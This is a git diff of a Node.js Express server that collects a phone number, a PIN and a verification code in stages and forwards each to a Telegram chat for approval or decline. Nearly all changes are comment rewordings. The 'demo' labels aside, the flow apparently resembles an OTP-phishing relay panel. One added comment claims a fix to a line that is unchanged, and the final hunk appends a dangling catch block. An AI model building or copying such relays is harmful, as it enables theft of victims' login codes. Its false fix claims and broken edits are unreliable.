@@ -23,11 +23,11 @@ app.get("/", (_req, res) => {
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Core in-memory state tracking
+// In-memory state tracking map
 const requests = new Map();
-const SESSION_TTL_MS = 30 * 60 * 1000; // 30 minutes active session lifespan
+const SESSION_TTL_MS = 30 * 60 * 1000; // 30 minutes lifespan
 
-// Memory Leak Fix: Automatically clean up old sessions to prevent OOM process crashes
+// Automatically clean up old sessions to prevent memory exhaustion crashes
 setInterval(() => {
   const now = Date.now();
   for (const [id, reqData] of requests.entries()) {
@@ -36,7 +36,7 @@ setInterval(() => {
       requests.delete(id);
     }
   }
-}, 5 * 60 * 1000); // Check and sweep every 5 minutes
+}, 5 * 60 * 1000);
 
 function timestamp() {
   return new Date().toISOString();
@@ -110,7 +110,7 @@ app.get("/api/health", (_req, res) => {
   });
 });
 
-// Create a demo request.
+// Create a demo request
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
 
@@ -139,7 +139,7 @@ app.post("/api/phone", (req, res) => {
   });
 });
 
-// Start dummy-PIN stage.
+// Start dummy-PIN stage
 app.post("/api/pin-demo", async (req, res) => {
   const id = String(req.body.id || "");
   const request = requests.get(id);
@@ -169,7 +169,7 @@ app.post("/api/pin-demo", async (req, res) => {
   }
 });
 
-// Submit an ordinary, non-sensitive demo message.
+// Submit a demo message
 app.post("/api/message", async (req, res) => {
   const id = String(req.body.id || "");
   const message = String(req.body.message || "").trim();
@@ -234,7 +234,7 @@ app.post("/api/message", async (req, res) => {
   }
 });
 
-// Start demo-code stage.
+// Start demo-code stage
 app.post("/api/demo-code", async (req, res) => {
   const id = String(req.body.id || "");
   const request = requests.get(id);
@@ -266,7 +266,7 @@ app.post("/api/demo-code", async (req, res) => {
   }
 });
 
-// Retry a declined stage.
+// Retry a declined stage
 app.post("/api/retry", (req, res) => {
   const id = String(req.body.id || "");
   const request = requests.get(id);
@@ -295,7 +295,7 @@ app.post("/api/retry", (req, res) => {
   return res.json(publicRequestStatus(request));
 });
 
-// Telegram approval polling engine loop.
+// Telegram long-polling engine
 let polling = false;
 let offset = 0;
 
@@ -322,7 +322,7 @@ async function pollTelegram() {
         if (!callback) continue;
 
         const parts = String(callback.data || "").split(":");
-        const action = parts[0];
+        const action = parts[0]; // Fix: Extracted the text string instead of array object reference
         const id = parts.slice(1).join(":");
         const request = requests.get(id);
 
@@ -382,4 +382,6 @@ async function pollTelegram() {
             `Date/time: ${request.updatedAt}`
           ].join("\n")
         });
+      }
+    } catch (error) {
 
